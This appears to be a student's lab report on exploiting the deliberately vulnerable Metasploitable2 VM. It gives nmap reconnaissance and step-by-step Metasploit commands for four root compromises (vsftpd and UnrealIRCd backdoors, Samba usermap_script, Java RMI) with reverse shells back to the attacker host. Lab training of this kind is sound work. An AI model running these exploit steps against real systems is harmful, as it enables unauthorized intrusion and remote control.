# Metasploitable2 Exploitation Report

**Name:** Agnes Yeboah
**Index Number:** 5230160043
**Date:** 2026-09-19
**Target IP:** 192.168.100.204
**Attacker OS / Tools:** Kali Linux, Metasploit Framework, nmap 7.99

---

## Reconnaissance Summary

Confirmed connectivity to the target with `ping -c 3 192.168.100.204` (0% packet loss), then ran a full service/version scan:

```
nmap -sV -sC 192.168.100.204
```

Key findings — 23 open ports in total, including several with well-known vulnerabilities:

- **21/tcp** - vsftpd 2.3.4 (anonymous FTP allowed; known backdoor vulnerability)
- **22/tcp** - OpenSSH 4.7p1 Debian
- **23/tcp** - Telnet (Linux telnetd)
- **25/tcp** - Postfix smtpd
- **53/tcp** - ISC BIND 9.4.2
- **80/tcp** - Apache httpd 2.2.8 (Ubuntu) DAV/2
- **111/tcp** - rpcbind (NFS, mountd, nlockmgr exposed)
- **139/445/tcp** - Samba smbd 3.0.20-Debian
- **512-514/tcp** - rexec/rlogin/rsh services
- **1099/tcp** - Java RMI registry (GNU Classpath grmiregistry)
- **1524/tcp** - "Metasploitable root shell" bindshell
- **2049/tcp** - NFS
- **2121/tcp** - ProFTPD 1.3.1
- **3306/tcp** - MySQL 5.0.51a-3ubuntu5
- **5432/tcp** - PostgreSQL 8.3.0-8.3.7
- **5900/tcp** - VNC (protocol 3.3)
- **6000/tcp** - X11 (access denied)
- **6667/tcp** - UnrealIRCd (known backdoor vulnerability)
- **8009/tcp** - Apache JServ Protocol (AJP)
- **8180/tcp** - Apache Tomcat/Coyote 1.1


## Exploit 1: vsftpd 2.3.4 Backdoor

- **Service / Port:** FTP / 21
- **Vulnerability:** vsftpd 2.3.4 contains a maliciously inserted backdoor (CVE-2011-2523) that opens a command shell on port 6200 when a specific string is sent in the FTP username.
- **Tool Used:** Metasploit — exploit/unix/ftp/vsftpd_234_backdoor
- **Why This Tool:** The recon scan (nmap -sV) identified the exact vulnerable version (vsftpd 2.3.4) running on port 21. Metasploit has a dedicated, reliable ("excellent" rank) module specifically built for this known backdoor, making it the most direct and effective way to exploit it rather than manually crafting the backdoor trigger by hand.
- **Steps:**
  1. `msfconsole`
  2. `search vsftpd`
  3. `use exploit/unix/ftp/vsftpd_234_backdoor`
  4. `set RHOSTS 192.168.100.204`
  5. `set LHOST 192.168.100.253`
  6. `run`
  7. Confirmed access with `sysinfo` and `getuid` inside the resulting Meterpreter session
- **Evidence:** evidence/exploit1.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives
  - **Reconnaissance:** The nmap scan identified vsftpd 2.3.4 running on port 21.
  - **Weaponization:** Selecting the vsftpd_234_backdoor module and configuring RHOSTS/LHOST paired the known vulnerability with a working payload.
  - **Delivery:** Running the module sent the malicious FTP connection/trigger string to the target's FTP service.
  - **Exploitation:** The backdoor was triggered, spawning a listening shell on the target.
  - **Installation:** The Meterpreter payload was delivered and executed, establishing a foothold.
  - **Command & Control:** The reverse TCP Meterpreter session gave an ongoing remote control channel back to Kali.
  - **Actions on Objectives:** Ran sysinfo and getuid to confirm full root-level access to the target.
- **Outcome / Impact:** Achieved a root-level Meterpreter session on the target with no authentication required — full compromise of the system via a single FTP connection.



---

## Exploit 2: UnrealIRCd 3.2.8.1 Backdoor

- **Service / Port:** IRC / 6667
- **Vulnerability:** UnrealIRCd 3.2.8.1 distribution archives were compromised and included a backdoor that executes arbitrary commands when a specially crafted string is sent through the IRC connection.
- **Tool Used:** Metasploit — exploit/unix/irc/unreal_ircd_3281_backdoor
- **Why This Tool:** Recon identified UnrealIRCd running on port 6667. Metasploit provides a dedicated "excellent" rated module for this specific known backdoor, making it far more reliable than attempting to manually replicate the backdoor trigger sequence over a raw IRC connection.
- **Steps:**
  1. `background` (to exit the previous Meterpreter session)
  2. `back`
  3. `search unrealircd`
  4. `use exploit/unix/irc/unreal_ircd_3281_backdoor`
  5. `set RHOSTS 192.168.100.204`
  6. `set LHOST 192.168.100.253`
  7. `run`
  8. Confirmed access with `sysinfo` and `getuid` inside the resulting Meterpreter session
- **Evidence:** evidence/exploit2.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives
  - **Reconnaissance:** The nmap scan identified UnrealIRCd running on port 6667.
  - **Weaponization:** Selecting the unreal_ircd_3281_backdoor module and configuring RHOSTS/LHOST paired the known vulnerability with a working payload.
  - **Delivery:** Metasploit registered an IRC user and sent the backdoor trigger string to the target's IRC service.
  - **Exploitation:** The planted backdoor executed the delivered command, triggering code execution.
  - **Installation:** The Meterpreter payload was delivered and executed, establishing a foothold.
  - **Command & Control:** The reverse TCP Meterpreter session gave an ongoing remote control channel back to Kali.
  - **Actions on Objectives:** Ran sysinfo and getuid to confirm full root-level access to the target.
- **Outcome / Impact:** Achieved a second, independent root-level Meterpreter session on the target via a completely different service (IRC instead of FTP), demonstrating the target has multiple unrelated critical vulnerabilities.



---

## Exploit 3: Samba "usermap_script" Command Execution

- **Service / Port:** SMB / 139 (also exposed on 445)
- **Vulnerability:** Samba versions 3.0.20 through 3.0.25rc3 mishandle the "username map script" configuration option, allowing shell metacharacters in the username field to be executed as commands on the server.
- **Tool Used:** Metasploit — exploit/multi/samba/usermap_script
- **Why This Tool:** Recon identified Samba smbd 3.0.20-Debian running on ports 139/445, a version range known to be vulnerable to this specific misconfiguration. Metasploit's dedicated "excellent" rated module reliably crafts and sends the malicious username string, which would be tedious and error-prone to replicate manually over raw SMB.
- **Steps:**
  1. `background` (to exit the previous session)
  2. `back`
  3. `search samba usermap`
  4. `use exploit/multi/samba/usermap_script`
  5. `set RHOSTS 192.168.100.204`
  6. `set LHOST 192.168.100.253`
  7. `run`
  8. Confirmed access with `whoami` and `id` inside the resulting command shell session
- **Evidence:** evidence/exploit3.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives
  - **Reconnaissance:** The nmap scan identified the vulnerable Samba 3.0.20-Debian version on ports 139/445.
  - **Weaponization:** Selecting the usermap_script module and configuring RHOSTS/LHOST paired the misconfiguration with a reverse shell payload.
  - **Delivery:** Metasploit sent a crafted username containing shell metacharacters to the Samba service.
  - **Exploitation:** Samba passed the malicious username to the shell unsanitized, executing the embedded command.
  - **Installation:** A reverse shell payload was executed on the target, establishing a foothold.
  - **Command & Control:** The reverse TCP command shell session gave an ongoing remote control channel back to Kali.
  - **Actions on Objectives:** Ran whoami and id to confirm full root-level access to the target.
- **Outcome / Impact:** Achieved a third, independent root-level shell on the target via a Samba misconfiguration, distinct from both prior exploits and demonstrating a different vulnerability class (command injection vs. planted backdoors).



---

## Exploit 4: Java RMI Server Insecure Default Configuration

- **Service / Port:** Java RMI / 1099
- **Vulnerability:** The Java RMI registry's default configuration does not restrict which classes can be loaded remotely, allowing an attacker to register a malicious remote object that executes arbitrary code when invoked.
- **Tool Used:** Metasploit — exploit/multi/misc/java_rmi_server
- **Why This Tool:** Recon identified an open Java RMI registry (GNU Classpath grmiregistry) on port 1099. A similarly-named module (java_rmi_connection_impl) targets vulnerable browser Java plugins and does not apply here; this server-side module was chosen because it specifically targets the insecure default RMI registry configuration matching what recon found.
- **Steps:**
  1. `background`
  2. `back`
  3. `search java_rmi`
  4. `use exploit/multi/misc/java_rmi_server`
  5. `set RHOSTS 192.168.100.204`
  6. `set LHOST 192.168.100.253`
  7. `run`
  8. Confirmed access with `sysinfo` and `getuid` inside the resulting Meterpreter session
- **Evidence:** evidence/exploit4.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives
  - **Reconnaissance:** The nmap scan identified the Java RMI registry running on port 1099.
  - **Weaponization:** Selecting the java_rmi_server module and configuring RHOSTS/LHOST paired the insecure configuration with a Java Meterpreter payload.
  - **Delivery:** Metasploit started a local HTTP server and sent an RMI call directing the target to fetch the payload JAR.
  - **Exploitation:** The target's RMI registry loaded and executed the malicious remote class without restriction.
  - **Installation:** The Java Meterpreter payload executed on the target, establishing a foothold.
  - **Command & Control:** The reverse TCP Meterpreter session gave an ongoing remote control channel back to Kali.
  - **Actions on Objectives:** Ran sysinfo and getuid to confirm full root-level access to the target.
- **Outcome / Impact:** Achieved a fourth, independent root-level Meterpreter session via the Java RMI service, demonstrating yet another distinct vulnerability class (insecure default configuration allowing remote class loading).
